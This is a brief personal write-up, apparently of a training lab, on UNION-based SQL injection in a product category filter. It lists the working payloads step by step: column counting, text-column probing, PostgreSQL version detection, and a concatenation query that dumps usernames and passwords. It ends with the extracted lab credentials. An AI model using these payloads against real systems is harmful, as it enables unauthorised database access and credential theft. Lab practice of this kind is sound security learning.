SQL Injection - PRoduct Category filter

End Goal: retrive all usernames and password and login as administrator.

Analysis:
---------
1) find the number of colounm that the vunerable colunm is using:
' order by 1-- -> not displayed on the page
' order by 2--
' order by 3--  -> intenal server error

3 - 2 = 1

(2) Find which coloumns contain text
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--  ->**

(3) Output data from other tables

' UNION SELECT NULL, username from users--
' UNION SELECT NULL, password from users--

(4) find the db version

' UNION SELECT NULL,@@version--

' UNION SELECT NULL,version()--  -> PostgreSQL

(5) creating the payload

-> ' UNION SELECT NULL, username || '*' ||password from users--

--------------------------

wiener*x8uhfx403b1g3tds35bw
administrator*jms2zhnalarorim5kc6v
carlos*qwxvhwugwmf35hy8b6zq


